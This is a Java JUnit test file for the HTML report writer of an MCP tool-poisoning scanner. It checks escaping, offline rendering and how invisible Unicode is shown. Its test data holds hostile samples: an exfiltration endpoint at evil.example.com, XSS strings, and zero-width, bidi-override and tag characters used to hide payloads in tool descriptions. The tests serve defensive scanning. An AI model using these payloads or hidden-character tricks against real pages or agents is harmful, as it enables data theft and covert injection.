package io.github.mcpredteam.core.report;

import io.github.mcpredteam.core.Confidence;
import io.github.mcpredteam.core.Finding;
import io.github.mcpredteam.core.MetadataScanner;
import io.github.mcpredteam.core.ScanReport;
import io.github.mcpredteam.core.Severity;
import io.github.mcpredteam.core.ThreatType;
import io.github.mcpredteam.core.fixture.PoisonedToolFixtures;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class HtmlFormatTest {

    private static ScanReport scanOfThePoisonedCorpus() {
        return MetadataScanner.withDefaultRules().scan(PoisonedToolFixtures.all());
    }

    private static String render(ScanReport report) {
        return Reports.html(report).render();
    }

    private static ScanReport reportOf(Finding... findings) {
        return new ScanReport(Instant.EPOCH, Instant.EPOCH, 1, List.of(findings));
    }

    private static Finding.Builder finding() {
        return Finding.builder("MCPRT-INJ-001")
                .threatType(ThreatType.TOOL_POISONING)
                .severity(Severity.HIGH)
                .confidence(Confidence.FIRM)
                .target("evil/tool")
                .message("payload");
    }

    @Test
    void theWholeReportIsOneSelfContainedPage() {
        String html = render(scanOfThePoisonedCorpus());

        assertTrue(html.startsWith("<!doctype html>"), "must be a complete document");
        assertTrue(html.trim().endsWith("</html>"), "must be a complete document");
        assertTrue(html.contains("<style>"), "styles must be inlined");
    }

    /**
     * Nothing on the page may reach the network.
     *
     * <p>The report is opened from a build artifact, sometimes on a machine that has just been
     * told one of its dependencies is hostile. A stylesheet, font or image fetched from a remote
     * host would make displaying the findings an outbound request, and would leave the page
     * rendering wrong wherever it is read offline — which is most places.
     *
     * <p>Asserted as the absence of anything that <em>fetches</em>, rather than the absence of
     * the substring {@code https://}. The first version of this test used the substring and
     * failed, correctly: an exfiltration URL is what half the corpus is accused of, so the
     * string appears all over a real report as the evidence for a finding. The property wanted
     * here is that no URL sits anywhere the browser would act on — which is a claim about
     * position, not about text.
     */
    @Test
    void nothingIsFetchedFromOutsideTheFile() {
        String html = render(scanOfThePoisonedCorpus());

        for (String fetching : List.of("src=", "href=", "url(", "@import", "<script", "<link",
                "<iframe", "<object", "<embed", "srcset=")) {
            assertFalse(html.contains(fetching),
                    "the page must contain nothing that fetches, found: " + fetching);
        }
    }

    /**
     * The attacker's own URL has to survive into the report, as text.
     *
     * <p>The companion to the test above, and the reason that one cannot simply ban the
     * substring. An exfiltration endpoint is the single most useful line in the finding that
     * reports it; a writer that stripped URLs to look safe would be deleting the evidence.
     */
    @Test
    void anExfiltrationUrlIsReportedRatherThanStripped() {
        String html = render(reportOf(finding()
                .evidence("match", "POST https://evil.example.com/collect")
                .build()));

        assertTrue(html.contains("https://evil.example.com/collect"),
                "the endpoint is the finding; it must appear in the report");
        assertFalse(html.contains("href=\"https://evil.example.com/collect\""),
                "but never as something the page would follow");
    }

    /**
     * A scan of nothing must not look like a clean bill of health.
     *
     * <p>Zero tools scanned yields zero findings, which in a visual format renders as a page with
     * a reassuring empty list — indistinguishable from a server that was examined and found
     * clean. Every output surface this project adds gets a guard against that, because the
     * failure mode does not go away when a new format appears, it relocates.
     */
    @Test
    void anEmptyScanSaysSoInsteadOfLookingClean() {
        String html = render(ScanReport.empty());

        assertTrue(html.contains("class=\"banner\""), "an empty scan must carry the banner");
        assertTrue(html.contains("establishes nothing"), "the banner must say what is wrong");
    }

    @Test
    void aScanThatFoundNothingDoesNotCarryTheEmptyScanBanner() {
        String html = render(new ScanReport(Instant.EPOCH, Instant.EPOCH, 7, List.of()));

        assertFalse(html.contains("class=\"banner\""), "7 tools were really scanned; that is a clean result");
        assertTrue(html.contains("No findings."));
    }

    @Test
    void everySeverityAppearsInTheBandEvenAtZero() {
        String html = render(reportOf(finding().build()));

        for (Severity severity : Severity.values()) {
            assertTrue(html.contains("tile sev-" + severity.name()),
                    severity + " must appear in the band, so a reader sees the zero rather than "
                            + "inferring it from an absence");
        }
    }

    @Test
    void findingsAreOrderedMostSevereFirst() {
        String html = render(scanOfThePoisonedCorpus());

        int critical = html.indexOf("finding sev-CRITICAL");
        int high = html.indexOf("finding sev-HIGH");
        int low = html.indexOf("finding sev-LOW");
        if (critical >= 0 && high >= 0) {
            assertTrue(critical < high, "CRITICAL findings must come before HIGH ones");
        }
        if (high >= 0 && low >= 0) {
            assertTrue(high < low, "HIGH findings must come before LOW ones");
        }
    }

    @Test
    void markupInAToolDescriptionCannotEscapeIntoThePage() {
        String html = render(reportOf(finding()
                .target("evil/<script>alert(1)</script>")
                .message("closes the \"attribute\" and opens a <b>tag</b>")
                .evidence("match", "<img src=x onerror=alert(1)>")
                .build()));

        assertFalse(html.contains("<script>alert(1)</script>"), "markup must not survive into the page");
        assertFalse(html.contains("<img src=x"), "markup must not survive into the page");
        assertTrue(html.contains("&lt;script&gt;"), "it must still be readable, escaped");
    }

    /**
     * Invisible characters are rendered visibly rather than passed through.
     *
     * <p>This is the one that matters most on this format. A zero-width space or a bidi override
     * written raw into HTML displays as nothing at all — which is exactly why the attacker chose
     * it, and this page is the evidence for a finding that exists <em>because</em> the character
     * is there. Dropping or passing it through makes the artifact disagree with the finding it is
     * reporting.
     */
    @Test
    void invisibleCharactersAreMadeVisible() {
        String html = render(reportOf(finding()
                .evidence("match", "transfer​funds‮evil")
                .build()));

        assertTrue(html.contains("\\u200b"), "a zero-width space must be shown, not rendered as nothing");
        assertTrue(html.contains("\\u202e"), "a bidi override must be shown");
        assertFalse(html.contains("​"), "no invisible character may survive into the page");
        assertFalse(html.contains("‮"), "no invisible character may survive into the page");
    }

    /**
     * A control character must not reach the page raw.
     *
     * <p>The JUnit XML writer has the harder version of this problem — XML 1.0 forbids most C0
     * controls outright, so leaving one in produces a report that kills the build parsing itself.
     * HTML is more forgiving and will simply swallow them, which is its own trap: the payload
     * that {@code MCPRT-UNI} fired on would vanish from the page reporting it.
     */
    @Test
    void controlCharactersAreEscapedRatherThanSwallowed() {
        String html = render(reportOf(finding().evidence("match", "beforeafter").build()));

        assertTrue(html.contains("\\u0001"), "the control character must be visible");
        assertFalse(html.contains(""), "it must not survive into the page raw");
    }

    /**
     * Escaping iterates code points, not chars.
     *
     * <p>The Unicode Tags block sits above the basic plane, so a char-wise loop sees two
     * surrogates and neither is invisible on its own — which would let through precisely the
     * payload most worth showing.
     */
    @Test
    void anAstralPlaneTagCharacterIsEscaped() {
        String tagLatinE = new String(Character.toChars(0xE0065));

        String html = render(reportOf(finding().evidence("match", "plain" + tagLatinE).build()));

        assertTrue(html.contains("\\udb40"), "the high surrogate must be shown");
        assertTrue(html.contains("\\udc65"), "the low surrogate must be shown");
        assertFalse(html.contains(tagLatinE), "the tag character must not survive into the page");
    }

    @Test
    void ordinaryNonAsciiIsLeftAlone() {
        String html = render(reportOf(finding().message("ノートを検索します").build()));

        assertTrue(html.contains("ノートを検索します"),
                "a Japanese description is not an evasion attempt and must stay readable");
    }

    @Test
    void theSameScanRendersTheSameBytes() {
        ScanReport report = scanOfThePoisonedCorpus();

        assertEquals(render(report), render(report));
    }

    /**
     * Two scans of an unchanged server differ only in the block that holds the clock.
     *
     * <p>The promise the format makes is that a diff of two reports shows findings changing or
     * shows nothing, so everything volatile is confined to one section near the top. Splitting
     * on that section and comparing the remainder is the only way to assert it.
     */
    @Test
    void onlyTheScanBlockMovesBetweenTwoRunsOfTheSameScan() {
        List<Finding> findings = scanOfThePoisonedCorpus().findings();
        String first = render(new ScanReport(Instant.parse("2026-01-01T00:00:00Z"),
                Instant.parse("2026-01-01T00:00:04Z"), 9, findings));
        String second = render(new ScanReport(Instant.parse("2026-08-18T11:22:33Z"),
                Instant.parse("2026-08-18T11:22:41Z"), 9, findings));

        assertEquals(afterTheScanBlock(first), afterTheScanBlock(second),
                "everything below the scan block must be byte-identical");
    }

    private static String afterTheScanBlock(String html) {
        return html.substring(html.indexOf("<main>"));
    }

    /**
     * Writes the page that the README screenshot is taken from.
     *
     * <p>Not an assertion about behaviour, and it earns its place for one reason: the image in
     * the README has to be regenerable by anyone who checks out the repository. A screenshot
     * whose source nobody can reproduce is the same problem as a hand-written trace — it asks a
     * reader to trust a picture, which is the trust this project declines to ask for everywhere
     * else. Re-run this and re-shoot when the rules or the layout change.
     *
     * <p>Goes to {@code target/} rather than a committed path: it is a build output, and the
     * committed artifact is the PNG, not the HTML.
     */
    @Test
    void writesTheSamplePageTheReadmeScreenshotIsTakenFrom() throws Exception {
        Path file = Path.of("target", "mcp-redteam", "sample-scan.html");

        Reports.html(scanOfThePoisonedCorpus()).writeTo(file);

        assertTrue(Files.size(file) > 0, "the sample page must not be empty");
    }

    @Test
    void theReportWritesToDiskAsUtf8(@TempDir Path dir) throws Exception {
        Path file = dir.resolve("nested/scan.html");

        Reports.html(reportOf(finding().message("ノート").build())).writeTo(file);

        assertTrue(Files.exists(file));
        assertTrue(Files.readString(file, StandardCharsets.UTF_8).contains("ノート"));
    }
}
